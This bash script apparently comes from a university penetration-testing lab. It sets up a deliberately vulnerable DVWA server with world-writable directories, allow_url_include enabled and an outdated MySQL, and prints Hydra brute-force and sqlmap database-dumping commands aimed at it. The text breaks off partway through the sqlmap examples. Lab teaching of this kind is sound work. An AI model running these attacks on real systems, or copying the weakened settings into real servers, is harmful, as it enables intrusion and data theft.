#!/bin/bash
# Script Name: dvwa-pentest-lab.sh
# Description: Automates DVWA setup on Ubuntu VM and attack tool setup/demonstration on Kali VM,
#              following a penetration testing tutorial.
#
# Usage for Ubuntu DVWA VM:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash
#       - Default: Installs SSH, DVWA with Apache2, and modern MySQL.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s mysql50
#       - Removes current DB server (MariaDB/MySQL) and installs MySQL 5.0.15 for DVWA.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s set_permissions_ubuntu
#       - Sets read/write permissions for DVWA directory (required for os-shell exploit).
#
# Usage for Kali VM (ensure DVWA Ubuntu VM is running and accessible):
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_prereqs
#       - Installs prerequisite attack tools on Kali.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_web_scan
#       - Runs dirb and gobuster web content scanners against DVWA.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_brute_force
#       - Provides instructions and sample commands for brute-force attacks (Burp Suite, Hydra).
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_vuln_scan
#       - Provides guidance for OWASP ZAP or OpenVAS scanning.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_sqlmap_sqli
#       - Provides sample sqlmap commands for basic SQL injection.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_os_shell
#       - Attempts to get an OS shell on DVWA VM via sqlmap and extracts sensitive files.

# Generate the script logs
LOGFILE="$(pwd)/dvwa-pentest-lab-$(date +"%Y%m%d-%H%M%S").log"
exec > >(tee -a "$LOGFILE") 2>&1

# Stricter Error Handling
set -euo pipefail
IFS=$'\n\t'

### ===== COLOR CONSTANTS ===== ###
RESET="\033[0m"
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
PINK="\033[1;35m"
CYAN="\033[1;36m"

### ===== PRINT FUNCTIONS ===== ###
print_info() { echo -e "${CYAN}[INFO]${RESET} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${RESET} $1"; }
print_warn() { echo -e "${YELLOW}[WARNING]${RESET} $1"; }
print_error() { echo -e "${RED}[ERROR]${RESET} $1"; }
print_title() { echo -e "\n${PINK}=== $1 ===${RESET}\n"; }

# Signal-safe Cleanup
cleanup() {
  local exit_code=$?
  if [ $exit_code -ne 0 ]; then
    print_error "Script exited with error code: $exit_code"
  fi
  print_info "Cleaning up before exit."
  # Add any specific cleanup logic here, e.g., remove temp files
}
handle_interrupt() {
  print_error "Script interrupted by user (SIGINT)" >&2
  exit 130
}
trap cleanup EXIT
trap handle_interrupt INT

# --- GLOBAL CONFIGURATION (USER EDITS REQUIRED ON KALI VM) ---
# IMPORTANT: For Kali VM functions, set the IP of your DVWA Ubuntu VM here.
# This IP must be reachable from your Kali VM.
# Example: "http://192.168.1.100" or "http://dvwa.local"
DVWA_TARGET_URL="http://192.168.56.101" # <<<--- !!! USER MUST UPDATE THIS ON KALI VM !!!
# -------------------------------------------------------------

### ===== UBUNTU DVWA VM FUNCTIONS ===== ###

# Function: ubuntu_install_ssh
# Installs and configures OpenSSH server on Ubuntu.
ubuntu_install_ssh() {
    print_title "=== Installing and Configuring OpenSSH Server ==="

    print_info "Updating system.."
    apt update && apt upgrade -y

    print_info "Installing OpenSSH server.."
    apt install -y openssh-server net-tools curl

    print_info "Editing SSH configuration: /etc/ssh/sshd_config"
    local SSHD_CONFIG="/etc/ssh/sshd_config"
    sed -i 's/^#Port 22/Port 22/' "$SSHD_CONFIG" || print_warn "Port 22 already uncommented or missing."
    sed -i 's/^#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/' "$SSHD_CONFIG" || print_warn "ListenAddress 0.0.0.0 already uncommented or missing."
    sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/' "$SSHD_CONFIG" || print_warn "PasswordAuthentication yes already uncommented or missing."
    # Optional: Enable root login, generally not recommended for security reasons
    # sed -i 's/^PermitRootLogin prohibit-password/PermitRootLogin yes/' "$SSHD_CONFIG" || true

    print_info "Configuring UFW firewall for SSH access.."
    ufw status || true
    ufw enable || print_warn "UFW already enabled."
    ufw allow 22 || print_warn "UFW rule for port 22 already exists."

    print_info "Restarting SSH service.."
    systemctl restart ssh

    print_success "OpenSSH server installed successfully!"
}

# Function: ubuntu_install_dvwa_apache_mysql
# Installs DVWA with Apache2, PHP, and Modern MySQL on Ubuntu.
ubuntu_install_dvwa_apache_mysql() {
    print_title "=== Installing DVWA with Apache2 and Modern MySQL ==="

    local DB_NAME="dvwa"
    local DB_USER="dvwa"
    local DB_HOST="localhost"
    local WEB_DIR="/var/www/html/dvwa"
    local SERVER_NAME="localhost" # Can be updated dynamically if needed.

    # --- Ask for SQL user password ---
    echo -e "\e[96mEnter SQL password for DVWA user (press Enter â†² for default: pass):\e[0m"
    read -s DB_PASS < /dev/tty
    echo
    DB_PASS=${DB_PASS:-pass}

    print_info "Installing required packages for DVWA (Apache, PHP, MySQL).."
    apt update
    apt install -y apache2 mysql-server php php-mysqli php-gd php-zip php-json php-bcmath php-xml libapache2-mod-php git

    print_info "Enabling and starting Apache & MySQL.."
    systemctl enable apache2 --now
    systemctl enable mysql --now

    print_info "Cloning DVWA repository.."
    cd /var/www/html
    if [ -d "DVWA" ] || [ -d "dvwa" ]; then
        print_info "DVWA folder already exists, skipping clone.."
    else
        git clone https://github.com/digininja/DVWA.git
        mv DVWA dvwa
    fi

    print_info "Setting permissions.."
    sudo chown -R www-data:www-data /var/www/html/dvwa
    sudo chmod -R 755 /var/www/html/dvwa

    print_info "Configuring MySQL for DVWA.."
    # This assumes root can connect to MySQL initially without a password, or via auth_socket.
    print_info "Attempting to create DVWA database and user. You might be prompted for MySQL root password if set."
    # Using 'mysql -p' to ensure it prompts for password if root has one set.
    mysql -u root -p <<EOF
    CREATE DATABASE IF NOT EXISTS ${DB_NAME};
    CREATE USER IF NOT EXISTS '${DB_USER}'@'${DB_HOST}' IDENTIFIED BY '${DB_PASS}';
    GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'${DB_HOST}';
    FLUSH PRIVILEGES;
EOF

    print_info "Updating DVWA config file.."
    cd "$WEB_DIR/config" || { print_error "DVWA config directory not found."; exit 1; }
    cp -n config.inc.php.dist config.inc.php
    local CONFIG_FILE="/var/www/html/dvwa/config/config.inc.php"
    if [ ! -f "$CONFIG_FILE" ]; then
        print_error "Error: Configuration file not found at $CONFIG_FILE"
        exit 1
    fi
    sed -i 's/\r//g' "$CONFIG_FILE"
    sed -i "/'db_server'/c\\
    \$_DVWA[ 'db_server' ] = '$DB_HOST';
    " "$CONFIG_FILE"
    sed -i "/'db_user'/c\\
    \$_DVWA[ 'db_user' ] = '$DB_USER';
    " "$CONFIG_FILE"
    sed -i "/'db_password'/c\\
    \$_DVWA[ 'db_password' ] = '$DB_PASS';
    " "$CONFIG_FILE"
    print_info "DVWA configuration file updated successfully."

    print_info "Configuring PHP settings for DVWA.."
    local PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3") # Fallback to 8.3
    local PHPINI="/etc/php/${PHP_VER}/apache2/php.ini"
    sed -i 's/^\s*allow_url_fopen\s*=.*/allow_url_fopen = On/' "$PHPINI" || true
    sed -i 's/^\s*allow_url_include\s*=.*/allow_url_include = On/' "$PHPINI" || true

    print_info "Restarting Apache.."
    systemctl restart apache2

    ### Apache Configuration for Localhost Only ###
    print_info "Setting Apache to localhost-only mode"
    # 1) Set GLOBAL ServerName in apache2.conf to prevent AH00558 warning
    if ! grep -q "ServerName" /etc/apache2/apache2.conf; then
        print_info "Adding global ServerName to apache2.conf"
        echo "ServerName ${SERVER_NAME}" | sudo tee -a /etc/apache2/apache2.conf > /dev/null
    else
        print_info "Updating existing global ServerName in apache2.conf"
        sudo sed -i "s/^ServerName.*/ServerName ${SERVER_NAME}/" /etc/apache2/apache2.conf
    fi
    # 2) Set Apache to listen only on 127.0.0.1:80
    sed -i 's/^Listen .*/Listen 80/' /etc/apache2/ports.conf
    # 3) Create DVWA VirtualHost config
    sudo tee /etc/apache2/sites-available/dvwa.conf > /dev/null <<EOF
    <VirtualHost *:80>
        ServerName ${SERVER_NAME}
        DocumentRoot /var/www/html

        <Directory /var/www/html/dvwa>
            Options Indexes FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>

        ErrorLog \${APACHE_LOG_DIR}/dvwa_error.log
        CustomLog \${APACHE_LOG_DIR}/dvwa_access.log combined
    </VirtualHost>
EOF
    # 3 Enable site and modules
    sudo a2ensite dvwa.conf || print_warn "DVWA site already enabled."
    sudo a2enmod rewrite || print_warn "Rewrite module already enabled."
    sudo a2dissite 000-default.conf || print_warn "Default site already disabled."
    sudo apache2ctl configtest
    sudo apache2ctl -S

    print_info "Configuring UFW firewall for HTTP access.."
    ufw allow 80 || print_warn "UFW rule for port 80 already exists."

    # 4 Restart Apache
    sudo systemctl restart apache2

    echo "======================================="
    print_success "[âœ”] DVWA configured successfully (Modern MySQL)!"
    print_title "Global ServerName set to ${SERVER_NAME}"
    curl -I http://localhost/dvwa/setup.php || print_warn "Curl to setup.php failed, verify Apache is running."
    print_title "  â†’ Accessible at: http://${SERVER_NAME}/dvwa/setup.php"
    print_title "Default DB User: ${DB_USER}, Password: ${DB_PASS}"
    print_title " Username : admin"
    print_title " Password : password (DVWA default)"
    echo "======================================="
}

# Function: ubuntu_downgrade_to_mysql50_dvwa
# Removes current database and installs MySQL 5.0.15 for DVWA on Ubuntu.
ubuntu_downgrade_to_mysql50_dvwa() {
    print_title "=== Downgrading DVWA Database to MySQL 5.0.15 ==="

    # Configuration for MySQL 5.0.15
    local MYSQL_VERSION="5.0.15"
    local MYSQL_TARBALL="mysql-standard-${MYSQL_VERSION}-linux-x86_64-glibc23.tar.gz"
    local MYSQL_URL="https://downloads.mysql.com/archives/get/p/23/file/${MYSQL_TARBALL}"
    local DOWNLOAD_DIR="/tmp/mysql_install"
    local INSTALL_DIR="/usr/local/mysql"
    local ROOT_PASSWORD="password" # Set the desired simple root password for MySQL 5.0.15
    local DVWA_DB_NAME="dvwa"
    local DVWA_DB_USER="dvwa"
    local DVWA_DB_PASS="pass" # Consistent with DVWA script default
    local DB_HOST="localhost"

    print_warn "This will completely remove existing MySQL/MariaDB packages and data. Proceed with caution!"
    read -p "Are you sure you want to continue? (y/N) " -n 1 -r
    echo

    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Aborting MySQL 5.0.15 downgrade."
        exit 1
    fi

    print_info "Stopping and purging existing database servers (MySQL/MariaDB)..."
    systemctl stop mysql || true # Stop modern MySQL if running
    systemctl stop mariadb || true # Stop MariaDB if running
    apt-get purge -y mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-* mariadb-server mariadb-client mariadb-common || true
    apt-get autoremove -y
    apt-get clean
    rm -rf /etc/mysql /var/lib/mysql /var/lib/mysql/mysql # Ensure old data directories are gone

    print_info "Installing dependencies for old MySQL..."
    apt-get update
    apt-get install -y libncurses5 libaio1 # libaio1 is often required for older MySQL

    print_info "Downloading old MySQL version ${MYSQL_VERSION}..."
    mkdir -p "$DOWNLOAD_DIR"
    cd "$DOWNLOAD_DIR"
    if [ ! -f "$MYSQL_TARBALL" ]; then
        wget "$MYSQL_URL" -O "$MYSQL_TARBALL"
    else
        print_info "$MYSQL_TARBALL already downloaded."
    fi

    print_info "Extracting and installing MySQL..."
    rm -rf "$INSTALL_DIR" # Clean up any previous attempts
    tar -xzf "$MYSQL_TARBALL"
    mv "mysql-standard-${MYSQL_VERSION}-linux-x86_64-glibc23" "$INSTALL_DIR"
    cd "$INSTALL_DIR"

    print_info "Creating mysql user and group..."
    groupadd mysql || true
    useradd -r -g mysql -s /bin/false mysql || true
    chown -R mysql .
    chgrp -R mysql .

    print_info "Initializing MySQL database..."
    "$INSTALL_DIR/scripts/mysql_install_db" --user=mysql --basedir="$INSTALL_DIR" --datadir="$INSTALL_DIR/data"
    chown -R root .
    chown -R mysql data

    print_info "Starting MySQL server..."
    "$INSTALL_DIR/bin/mysqld_safe" --user=mysql &
    local MYSQL_PID=$! # Store PID for later
    sleep 15 # Give it time to start

    if ! kill -0 "$MYSQL_PID" 2>/dev/null; then
        print_error "MySQL 5.0.15 server failed to start. Check logs for errors."
        exit 1
    fi
    print_info "MySQL 5.0.15 server started with PID: $MYSQL_PID"

    print_info "Setting root password to '${ROOT_PASSWORD}'..."
    # MySQL 5.0.15's mysqladmin might require different syntax for initial password set
    echo "Attempting to set root password for MySQL 5.0.15. If it fails, you might need to manually reset or start without grant tables."
    "$INSTALL_DIR/bin/mysqladmin" -u root password "${ROOT_PASSWORD}" || \
    (print_warn "Could not set root password directly. Trying again with the old 'mysql -u root SET PASSWORD...' method." && \
    "$INSTALL_DIR/bin/mysql" -u root -e "UPDATE mysql.user SET Password=PASSWORD('${ROOT_PASSWORD}') WHERE User='root'; FLUSH PRIVILEGES;") || \
    print_error "Failed to set root password for MySQL 5.0.15. Manual intervention required."

    print_info "Creating DVWA database and user..."
    "$INSTALL_DIR/bin/mysql" -u root -p"${ROOT_PASSWORD}" -e "CREATE DATABASE IF NOT EXISTS ${DVWA_DB_NAME};"
    "$INSTALL_DIR/bin/mysql" -u root -p"${ROOT_PASSWORD}" -e "CREATE USER IF NOT EXISTS '${DVWA_DB_USER}'@'${DB_HOST}' IDENTIFIED BY '${DVWA_DB_PASS}';"
    "$INSTALL_DIR/bin/mysql" -u root -p"${ROOT_PASSWORD}" -e "GRANT ALL PRIVILEGES ON ${DVWA_DB_NAME}.* TO '${DVWA_DB_USER}'@'${DB_HOST}';"
    "$INSTALL_DIR/bin/mysql" -u root -p"${ROOT_PASSWORD}" -e "FLUSH PRIVILEGES;"

    print_info "Stopping MySQL 5.0.15 for proper shutdown."
    "$INSTALL_DIR/bin/mysqladmin" -u root -p"${ROOT_PASSWORD}" shutdown || print_warn "Failed to gracefully shut down MySQL 5.0.15."
    wait "$MYSQL_PID" 2>/dev/null || print_warn "mysqld_safe process did not terminate gracefully."

    print_info "Configuring MySQL 5.0.15 to start on boot (manual step - this is a simple run, not a systemd service)."
    print_warn "MySQL 5.0.15 is not integrated as a systemd service. You will need to start it manually: '$INSTALL_DIR/bin/mysqld_safe --user=mysql &' or create a custom systemd service unit."

    print_info "Updating DVWA config file for MySQL 5.0.15.."
    local WEB_DIR_DVWA="/var/www/html/dvwa" # Use specific local variable to avoid conflict if cd'd
    local CONFIG_FILE="$WEB_DIR_DVWA/config/config.inc.php"
    if [ ! -f "$CONFIG_FILE" ]; then
        print_error "DVWA configuration file not found at $CONFIG_FILE. Did DVWA get installed first?"
        exit 1
    fi
    sed -i 's/\r//g' "$CONFIG_FILE" # Remove Windows-style carriage returns
    sed -i "/'db_server'/c\\
    \$_DVWA[ 'db_server' ] = '${DB_HOST}';
    " "$CONFIG_FILE"
    sed -i "/'db_user'/c\\
    \$_DVWA[ 'db_user' ] = '${DVWA_DB_USER}';
    " "$CONFIG_FILE"
    sed -i "/'db_password'/c\\
    \$_DVWA[ 'db_password' ] = '${DVWA_DB_PASS}';
    " "$CONFIG_FILE"
    print_info "DVWA configuration file updated for MySQL 5.0.15."

    print_success "MySQL 5.0.15 downgrade and DVWA database configuration complete!"
    print_info "Remember to start MySQL 5.0.15 manually if needed: '$INSTALL_DIR/bin/mysqld_safe --user=mysql &' (from the Ubuntu VM)"
    print_info "Go to DVWA's /setup.php page in your browser to configure and create the database tables."
}

# Function: ubuntu_set_dvwa_permissions
# Sets read/write permissions for the DVWA directory on Ubuntu (for OS shell exploit).
ubuntu_set_dvwa_permissions() {
    print_title "=== Setting DVWA Directory Permissions for OS Shell Exploitation ==="
    local DVWA_PATH="/var/www/html/dvwa"
    if [ ! -d "$DVWA_PATH" ]; then
        print_error "DVWA directory '$DVWA_PATH' not found. Please ensure DVWA is installed first."
        exit 1
    fi
    print_warn "WARNING: This command makes the DVWA directory and its contents world-writable (ugo+rw), which is a significant security risk for any production environment!"
    read -p "Are you absolutely sure you want to run 'chmod -R ugo+rw ${DVWA_PATH}'? (y/N) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Aborting permission change. OS shell exploitation might fail without this."
        exit 1
    fi
    sudo chmod -R ugo+rw "$DVWA_PATH"
    print_success "Permissions set for $DVWA_PATH to be world-writable (ugo+rw)."
    print_info "This is specifically for enabling sqlmap's --os-shell upload capabilities to write files to the web root."
}


### ===== KALI VM FUNCTIONS ===== ###

# Function: kali_install_tools_prerequisites
# Installs common penetration testing tools on Kali Linux.
kali_install_tools_prerequisites() {
    print_title "=== Installing Kali Attack Tools Prerequisites ==="

    print_info "Updating system and installing required attack tools.."
    sudo apt update
    # Included burpsuite and zaproxy as they are in Kali repos, but still warn about GUI/setup.
    sudo apt install -y \
      dirb gobuster seclists \
      hydra sqlmap nikto burpsuite zaproxy \
      net-tools curl git # Basic utilities

    print_info "--- Tool-Specific Notes ---"
    print_warn "Burp Suite and OWASP ZAP are typically GUI applications. You may need to launch them manually."
    print_info "Burp Suite: Launch from applications menu or 'burpsuite'."
    print_info "OWASP ZAP: Launch from applications menu or 'zaproxy'."
    print_warn "OpenVAS (GVM) setup can be complex and requires 'gvm-setup' or 'openvas-setup' to be run interactively and will take a long time (hours)."
    print_info "Consider installing 'kali-linux-default' or 'kali-linux-web' metapackages for a broader set of tools if you need more."
    print_info "---------------------------"

    print_success "Kali attack tools prerequisites installation complete."
}

# Function: kali_run_web_content_scanners
# Runs dirb and gobuster against the DVWA target URL.
kali_run_web_content_scanners() {
    print_title "=== Running Web Content Scanners (dirb, gobuster) ==="

    if [ -z "$DVWA_TARGET_URL" ] || [[ "$DVWA_TARGET_URL" == "http://192.168.56.101" ]]; then
        print_error "DVWA_TARGET_URL is not set or still at default value. Please update the 'DVWA_TARGET_URL' variable in this script."
        exit 1
    fi

    local TARGET="$DVWA_TARGET_URL"
    local WORDLIST="/usr/share/wordlists/dirb/common.txt" # Common wordlist for dirb/gobuster
    local OUTDIR="$HOME/scans/dvwa/web_content"
    mkdir -p "$OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    # Check if the target is reachable before scanning
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')
    if ! ping -c 1 "$TARGET_HOST" &>/dev/null; then
        print_error "Cannot reach target DVWA VM at ${TARGET_HOST}. Ensure network connectivity and correct DVWA_TARGET_URL."
        exit 1
    fi
    # Also check if the web server is responding
    if ! curl -s -o /dev/null -w "%{http_code}" "$TARGET" | grep -q "^200"; then
        print_warn "DVWA target ${TARGET} returned non-200 HTTP status code. It might not be fully functional or accessible."
    fi

    # Run dirb scan
    print_info "Starting Dirb scan against ${TARGET}..."
    if [ -f "$WORDLIST" ]; then
        dirb "$TARGET" "$WORDLIST" -o "$OUTDIR/dirb_raw.txt" || print_warn "Dirb scan failed or completed with errors. Check target and wordlist."
    else
        print_error "Wordlist not found: $WORDLIST. Skipping dirb scan."
    fi

    # Run gobuster scan with increased threads for speed
    print_info "Starting Gobuster scan against ${TARGET}..."
    if [ -f "$WORDLIST" ]; then
        gobuster dir -u "$TARGET" -w "$WORDLIST" -t 50 -o "$OUTDIR/gobuster_raw.txt" || print_warn "Gobuster scan failed or completed with errors. Check target and wordlist."
    else
        print_error "Wordlist not found: $WORDLIST. Skipping gobuster scan."
    fi

    print_info "Processing web content scan results..."
    if [ -f "$OUTDIR/dirb_raw.txt" ]; then
        grep '^==>' "$OUTDIR/dirb_raw.txt" | awk '{print $3}' | sed "s|$TARGET||" | sort -u > "$OUTDIR/dirb_paths.txt" || true
    else
        print_warn "Dirb raw output not found, cannot process dirb paths."
    fi

    if [ -f "$OUTDIR/gobuster_raw.txt" ]; then
        grep -E '^/' "$OUTDIR/gobuster_raw.txt" | awk '{print $1}' | sort -u > "$OUTDIR/gobuster_paths.txt" || true
    else
        print_warn "Gobuster raw output not found, cannot process gobuster paths."
    fi

    if [ -f "$OUTDIR/dirb_paths.txt" ] && [ -f "$OUTDIR/gobuster_paths.txt" ]; then
        comm -12 "$OUTDIR/dirb_paths.txt" "$OUTDIR/gobuster_paths.txt" > "$OUTDIR/common_paths.txt" || true
        print_info "Common paths found by dirb and gobuster saved to $OUTDIR/common_paths.txt"
    else
        print_warn "Cannot compare paths, one or both path files missing."
    fi

    print_success "Web content scan results saved in $OUTDIR"
    print_info "Review files in $OUTDIR for discovered web objects (directories and files)."
}

# Function: kali_demonstrate_brute_force
# Provides instructions and sample commands for brute-force attacks using Burp Suite and Hydra.
kali_demonstrate_brute_force() {
    print_title "=== Brute-Force Attack Demonstration ==="

    if [ -z "$DVWA_TARGET_URL" ] || [[ "$DVWA_TARGET_URL" == "http://192.168.56.101" ]]; then
        print_error "DVWA_TARGET_URL is not set or still at default value. Please update the 'DVWA_TARGET_URL' variable in this script."
        exit 1
    fi

    local TARGET="$DVWA_TARGET_URL"
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')

    print_info "Targeting DVWA VM at: ${TARGET}"

    print_info "1. Prepare DVWA (from Kali browser):"
    print_info "   - Log into DVWA as 'admin' / 'password'."
    print_info "   - Navigate to 'DVWA Security' and set the 'Security Level' to 'Low'."
    print_info "   - Click 'Submit'."
    print_info "   (Optional: Use curl with a valid session cookie to set security, e.g.,)"
    echo "${GREEN}   curl -s -X POST -d 'security=low&seclev_submit=Submit' -b 'PHPSESSID=<YOUR_PHPSESSID_HERE>; security=impossible' ${TARGET}/dvwa/security.php${RESET}"
    print_warn "   Remember to replace <YOUR_PHPSESSID_HERE> with a valid DVWA session cookie obtained from your browser."

    print_info "2. Configure Burp Suite as your proxy (manual steps):"
    print_info "   - Start Burp Suite (Community Edition is sufficient)."
    print_info "   - Configure your Kali browser (e.g., Firefox) to use Burp as an HTTP proxy (typically localhost:8080)."
    print_info "   - Turn 'Intercept is on' in Burp Proxy tab."
    print_info "   - Navigate to DVWA's brute force page: ${TARGET}/dvwa/vulnerabilities/brute/"
    print_info "   - Enter any username/password (e.g., 'admin'/'password') and click 'Login'."
    print_info "   - Intercept the request in Burp, right-click, and 'Send to Intruder'."
    print_info "   - In Intruder, define attack type (e.g., 'Sniper' or 'Cluster Bomb' if multiple fields)."
    print_info "   - Set payload positions for username and/or password."
    print_info "   - Load wordlists (e.g., from /usr/share/seclists) for payloads."
    print_info "   - Start the attack and analyze responses to find successful logins."

    print_info "3. Hydra brute force sample command (CLI alternative):"
    local USERNAMES_WORDLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
    local PASSWORDS_WORDLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"

    if [ ! -f "$USERNAMES_WORDLIST" ]; then
        print_warn "Usernames wordlist not found: $USERNAMES_WORDLIST. Hydra command might fail."
    fi
    if [ ! -f "$PASSWORDS_WORDLIST" ]; then
        print_warn "Passwords wordlist not found: $PASSWORDS_WORDLIST. Hydra command might fail."
    fi

    echo "${GREEN}hydra -L ${USERNAMES_WORDLIST} -P ${PASSWORDS_WORDLIST} -s 80 -f -vV ${TARGET_HOST} http-form-post '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect'${RESET}"
    print_info "   - The '-L' and '-P' flags specify the username and password lists."
    print_info "   - '-s 80' specifies port 80 (default for HTTP)."
    print_info "   - '-f' tells Hydra to exit after the first successful login."
    print_info "   - '-vV' for verbose output."
    print_info "   - 'http-form-post' specifies the attack type for web forms."
    print_info "   - '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect' defines the target URL, POST data structure, and the failure string."

    print_success "Brute-force attack instructions provided. Manual execution and observation are required."
}

# Function: kali_demonstrate_vuln_scanners
# Provides guidance for using OWASP ZAP or OpenVAS for vulnerability scanning.
kali_demonstrate_vuln_scanners() {
    print_title "=== Vulnerability Scanning Demonstration (OWASP ZAP / OpenVAS) ==="

    if [ -z "$DVWA_TARGET_URL" ] || [[ "$DVWA_TARGET_URL" == "http://192.168.56.101" ]]; then
        print_error "DVWA_TARGET_URL is not set or still at default value. Please update the 'DVWA_TARGET_URL' variable in this script."
        exit 1
    fi

    local TARGET="$DVWA_TARGET_URL"
    local OUTDIR="$HOME/scans/dvwa/vuln_reports"
    mkdir -p "$OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    print_info "1. OWASP ZAP Setup and Scan (Recommended for Web Applications):"
    print_info "   - Launch OWASP ZAP (from applications menu or 'zaproxy')."
    print_info "   - Configure ZAP as a proxy for your Kali browser, or use its built-in browser (e.g., Firefox with ZAP HUD)."
    print_info "   - Navigate to ${TARGET}/dvwa/setup.php and complete DVWA setup if needed."
    print_info "   - Log in to DVWA (admin/password) and set security to 'Low'."
    print_info "   - Manually browse all DVWA pages and use all functionalities (login, SQLi, XSS, upload, etc.) to spider the application thoroughly."
    print_info "   - In ZAP, select the DVWA URL from the 'Sites' tree."
    print_info "   - Right-click on the DVWA site -> 'Attack' -> 'Active Scan...'. Confirm and start the scan."
    print_info "   - Once the scan completes, go to 'Report' -> 'Generate HTML Report...' and save the report to ${OUTDIR}/zap_report.html."
    print_warn "   Note: Automated headless ZAP scans (using zap-cli) are possible but require additional setup and scripting."

    print_info "2. OpenVAS (GVM) Setup and Scan (More for Network/System Vulnerabilities):"
    print_info "   - OpenVAS (now GVM) is a powerful network vulnerability scanner but requires significant setup and can consume considerable system resources and time (hours or more for initial setup)."
    print_info "   - If GVM is not set up, run 'sudo gvm-setup' in a terminal. Follow all prompts."
    print_info "   - Access the GVM web interface (usually https://127.0.0.1:9392 from Kali) using the credentials provided during setup."
    print_info "   - Navigate to 'Configuration' -> 'Targets'. Create a new target for your DVWA VM's IP address (e.g., ${TARGET_HOST})."
    print_info "   - Navigate to 'Scans' -> 'Tasks'. Create a new task, select the DVWA target, and choose a suitable scan configuration (e.g., 'Full and fast')."
    print_info "   - Start the task and wait for it to complete."
    print_info "   - Once the scan is complete, view the report in the GVM interface. Export it (e.g., to PDF or HTML) and save it to ${OUTDIR}/openvas_report.pdf (or .html)."

    print_info "3. Manual Vulnerability Confirmation and Analysis:"
    print_info "   - For each 'important' finding listed in your ZAP or OpenVAS report (e.g., SQL Injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), File Inclusion, Broken Authentication):"
    print_info "     - Manually attempt to reproduce and confirm the vulnerability using your browser or command-line tools against DVWA."
    print_info "     - Analyze the DVWA source code (e.g., in /var/www/html/dvwa/vulnerabilities/) to understand why the vulnerability exists (e.g., lack of input validation, insufficient escaping)."
    print_info "     - Document your findings, including steps to reproduce, impact, and root cause."

    print_success "Vulnerability scanning guidance provided. Manual execution, configuration, and analysis are crucial for these tasks."
}

# Function: kali_demonstrate_sqlmap_sqli
# Provides sample sqlmap commands for basic SQL injection attacks against DVWA.
kali_demonstrate_sqlmap_sqli() {
    print_title "=== SQLmap SQL Injection Demonstration ==="

    if [ -z "$DVWA_TARGET_URL" ] || [[ "$DVWA_TARGET_URL" == "http://192.168.56.101" ]]; then
        print_error "DVWA_TARGET_URL is not set or still at default value. Please update the 'DVWA_TARGET_URL' variable in this script."
        exit 1
    fi

    local TARGET="$DVWA_TARGET_URL"
    local SQLMAP_OUTDIR="$HOME/scans/dvwa/sqlmap_sqli"
    mkdir -p "$SQLMAP_OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    print_info "Before running sqlmap:"
    print_info "1. Log into DVWA (admin/password) from your Kali browser."
    print_info "2. Set the 'Security Level' to 'Low' under 'DVWA Security'."
    print_info "3. Navigate to 'SQL Injection (Blind)' or 'SQL Injection' vulnerabilities."
    print_info "4. Capture your PHPSESSID cookie from browser developer tools (e.g., Firefox: F12 -> Storage -> Cookies)."
    print_warn "   You MUST replace <YOUR_PHPSESSID_HERE> with your actual PHPSESSID cookie value for these commands to work."
    echo ""

    print_info "Example 1: Listing databases using sqlmap against DVWA SQLi (GET) vulnerability:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    --dbs --batch --level=1 --risk=1 \\"
    echo "    --output-dir=\"${SQLMAP_OUTDIR}\" --file-log=\"${SQLMAP_OUTDIR}/sqlmap_sqli_dbs.log\"${RESET}"
    echo ""

    print_info "Example 2: Dumping tables from the 'dvwa' database:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    -D dvwa --tables --batch --level=1 --risk=1 \\"
